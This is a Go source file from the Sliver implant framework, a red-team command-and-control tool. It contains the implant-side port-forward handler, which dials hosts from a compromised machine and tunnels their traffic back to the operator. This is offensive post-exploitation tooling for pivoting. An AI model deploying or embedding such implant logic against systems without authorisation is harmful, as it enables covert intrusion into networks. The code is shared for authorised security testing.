package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"

	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	portfwdReq := &sliverpb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, portfwdResp)
		return
	}

	var defaultDialer = new(net.Dialer)

	// TODO: Configurable context
	remoteAddress := fmt.Sprintf("%s:%d", portfwdReq.Host, portfwdReq.Port)
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
	// {{end}}

	ctx, cancelContext := context.WithCancel(context.Background())

	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to dial remote address %s", err)
		// {{end}}
		cancelContext()
		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, portfwdResp)
		return
	}
	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(30 * time.Second)
	}

	// Add tunnel
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Creating tcp tunnel")
	// {{end}}
	tunnel := transports.NewTunnel(
		portfwdReq.TunnelID,
		dst,
		dst,
	)
	connection.AddTunnel(tunnel)

	// Send portfwd response
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Port:     portfwdReq.Port,
		Host:     portfwdReq.Host,
		Protocol: sliverpb.PortFwdProtoTCP,
		TunnelID: portfwdReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: portfwdResp,
	}

	once := sync.Once{}
	cleanup := func(reason error) {
		once.Do(func() {
			// {{if .Config.Debug}}
			log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
			// {{end}}
			cleanupTunnel := connection.Tunnel(tunnel.ID)
			if cleanupTunnel == nil {
				return
			}

			tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
				Closed:   true,
				TunnelID: cleanupTunnel.ID,
			})
			connection.Send <- &sliverpb.Envelope{
				Type: sliverpb.MsgTunnelClose,
				Data: tunnelClose,
			}
			connection.RemoveTunnel(cleanupTunnel.ID)
			if dst != nil {
				dst.Close()
			}
			cancelContext()
		})
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		// portfwd only uses one reader, hence the tunnel.Readers[0]
		n, err := io.Copy(tWriter, tunnel.Readers[0])
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()
}
